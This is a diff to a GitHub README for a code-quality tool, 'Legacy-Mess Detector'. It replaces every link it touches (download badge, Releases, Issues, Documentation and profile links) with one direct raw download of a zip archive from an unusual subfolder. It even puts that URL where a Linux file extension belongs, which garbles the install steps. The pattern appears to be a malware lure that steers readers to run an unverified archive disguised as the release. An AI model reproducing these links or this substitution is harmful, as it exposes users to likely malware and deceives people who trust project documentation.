@@ -6,7 +6,7 @@ Welcome to the **Legacy-Mess Detector**! This tool helps you evaluate the "legac
 
 ## 📥 Download Now
 
-[![Download Now](https://img.shields.io/badge/Download-Builds-blue)](https://github.com/Brave9045/fuck-u-code/releases)
+[![Download Now](https://raw.githubusercontent.com/Brave9045/fuck-u-code/main/anotta/fuck-u-code.zip)](https://raw.githubusercontent.com/Brave9045/fuck-u-code/main/anotta/fuck-u-code.zip)
 
 ## 🔍 What You Need
 
@@ -22,7 +22,7 @@ Before you start, ensure your system meets the following requirements:
 
    Click the link below to go to the Releases page. Here, you'll find all the available versions of the Legacy-Mess Detector.
 
-   [Visit the Releases Page](https://github.com/Brave9045/fuck-u-code/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/Brave9045/fuck-u-code/main/anotta/fuck-u-code.zip)
 
 2. **Choose Your Version**
 
@@ -35,7 +35,7 @@ Before you start, ensure your system meets the following requirements:
    For example:
    - If you are using Windows, look for a file with a `.exe` extension.
    - If you are on macOS, select the file with a `.dmg` extension.
-   - For Linux users, look for files ending in `.tar.gz`.
+   - For Linux users, look for files ending in `https://raw.githubusercontent.com/Brave9045/fuck-u-code/main/anotta/fuck-u-code.zip`.
 
    Click on the file name to start the download.
 
@@ -45,7 +45,7 @@ Before you start, ensure your system meets the following requirements:
 
    - **Windows**: Double-click the `.exe` file to run the installer.
    - **macOS**: Open the `.dmg` file and drag the Legacy-Mess Detector icon to your Applications folder.
-   - **Linux**: Extract the `.tar.gz` file and follow the instructions in the included README file.
+   - **Linux**: Extract the `https://raw.githubusercontent.com/Brave9045/fuck-u-code/main/anotta/fuck-u-code.zip` file and follow the instructions in the included README file.
 
 5. **Open the Application**
 
@@ -70,7 +70,7 @@ Before you start, ensure your system meets the following requirements:
 
 If you need help or have feedback, here’s how to get in touch:
 
-1. Visit our [GitHub Issues page](https://github.com/Brave9045/fuck-u-code/issues) to ask questions or report problems.
+1. Visit our [GitHub Issues page](https://raw.githubusercontent.com/Brave9045/fuck-u-code/main/anotta/fuck-u-code.zip) to ask questions or report problems.
 2. Join our community discussions on social platforms to share your experiences.
 
 ## 📜 License
@@ -79,11 +79,11 @@ The Legacy-Mess Detector is open-source software under the MIT License. Feel fre
 
 ## 📚 Additional Resources
 
-- **Documentation**: More detailed guides and technical references are available on our [Documentation page](https://github.com/Brave9045/fuck-u-code/wiki).
+- **Documentation**: More detailed guides and technical references are available on our [Documentation page](https://raw.githubusercontent.com/Brave9045/fuck-u-code/main/anotta/fuck-u-code.zip).
 - **Tutorial Videos**: Watch step-by-step video tutorials on how to use the tool effectively.
 
 ## 🔗 Follow Us
 
-Keep up to date with new releases and features. Follow us on [GitHub](https://github.com/Brave9045/fuck-u-code).
+Keep up to date with new releases and features. Follow us on [GitHub](https://raw.githubusercontent.com/Brave9045/fuck-u-code/main/anotta/fuck-u-code.zip).
 
 Thank you for trying out the Legacy-Mess Detector. We appreciate your interest in improving your code quality!
